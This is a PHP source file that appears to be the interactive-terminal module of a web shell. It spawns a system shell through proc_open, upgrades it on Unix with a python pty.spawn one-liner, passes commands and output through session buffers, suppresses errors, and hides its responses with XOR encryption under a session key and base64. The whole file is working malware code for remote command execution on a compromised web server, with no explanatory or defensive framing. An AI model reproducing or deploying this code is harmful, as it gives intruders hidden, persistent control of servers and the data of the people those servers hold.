@error_reporting(0);

function main($cmdPath="", $cmd="",$option="")
{
	
    $result = "Success";
    if ($option == "create") {
        create($cmdPath);
    } else if ($option == "read") {
    	if (isset($_SESSION["readBuffer"]))
    	{
    	@session_start();
        $readContent = $_SESSION["readBuffer"];
        
        session_write_close();
        $result= $readContent;
		}
    } else if ($option == "write") {
        @session_start();
		$_SESSION["readBuffer"] = "";
        $_SESSION["writeBuffer"] = $cmd;
        session_write_close();
    }
    else if ($option == "stop") {
        @session_start();
         $_SESSION["run"] = false;
        session_write_close();
    }
    echo encrypt($result,$_SESSION['k']);
}

function getSafeStr($str){
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}

function create($cmdPath)
{
    set_time_limit(0);
    @session_start();
   $_SESSION["readBuffer"] = "";
    session_write_close();
    $win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
    if ($win) {
        $outputfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . rand() . ".txt";
        $errorfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . rand() . ".txt";
    }
    $descriptorspec = array(
        0 => array(
            "pipe",
            "r"
        ),
        1 => array(
            "pipe",
            "w"
        ),
        2 => array(
            "pipe",
            "w"
        )
    );
    if ($win) {
        $descriptorspec[1] = array(
            "file",
            $outputfile,
            "a"
        );
        $descriptorspec[2] = array(
            "file",
            $errorfile,
            "a"
        );
    }
    $process = proc_open($cmdPath, $descriptorspec, $pipes);
    
    if (! is_resource($process)) {
        exit(1);
    }
    
    stream_set_blocking($pipes[0], 0);
    
    if ($win) {
        $reader = fopen($outputfile, "r+");
        $error = fopen($errorfile, "r+");
    } else {
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        $reader = $pipes[1];
        $error = $pipes[2];
    }
    
    @session_start();
    $_SESSION["run"] = true;
    session_write_close();
    /*
    ob_end_clean();
    header("Connection: close");
    ignore_user_abort();
    ob_start();
    echo str_pad('',129);
    $size = ob_get_length();
    header("Content-Length: $size");
    ob_flush();
    ob_end_flush();
    flush();
    */
    if (!$win) {
        fwrite($pipes[0], sprintf("python -c 'import pty; pty.spawn(\"%s\")'\n", $cmdPath));
        fflush($pipes[0]);
    }
    
    sleep(1);
    $idle=0;
    while ($_SESSION["run"] and $idle<1000000) {
        @session_start();
        @$writeBuffer = $_SESSION["writeBuffer"];
        session_write_close();
        if (strlen($writeBuffer) > 0) {
            fwrite($pipes[0], $writeBuffer);
            fflush($pipes[0]);
            
            session_start();
            $_SESSION["writeBuffer"] = "";
            session_write_close();
            $idle=0;
        }
        else
        {
         $idle=$idle+1;
        }
        while (($output = fread($reader, 10240)) != false) {
           /* if ($win)
            {
            fseek($reader, strlen($output));
            }*/
            if (!function_exists("mb_convert_encoding"))
                {
                   $output=getSafeStr($output);
                }
                else
                {
                	$output=mb_convert_encoding($output, 'UTF-8', mb_detect_encoding($output, "UTF-8,GBK"));
                }
            @session_start();
            $_SESSION["readBuffer"] = $_SESSION["readBuffer"] . $output;
            session_write_close();
        }
        if ($win)
            ftruncate($reader, 0);
        while (($errput = fread($error, 10240)) != false) {
           
            /*if ($win)
            {
             fseek($error, strlen($errput));
            }*/
            
            if (!function_exists("mb_convert_encoding"))
                {
                   $errput=getSafeStr($errput);
                }
                else
                {
                	$errput=mb_convert_encoding($errput, 'UTF-8', mb_detect_encoding($errput, "UTF-8,GBK"));
                }
            @session_start();
            $_SESSION["writeBuffer"]="\n";
            $_SESSION["readBuffer"] = $_SESSION["readBuffer"] . $errput;
            session_write_close();
        }
        if ($win)
            ftruncate($error, 0);
        sleep(0.8);
    }
    fclose($reader);
    fclose($error);
    unset($_SESSION["readBuffer"]);
    if ($win)
    {
        unlink($outputfile);
		unlink($errorfile);
    }

}

function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+1&15]; 
    }
	return base64_encode($data);
}
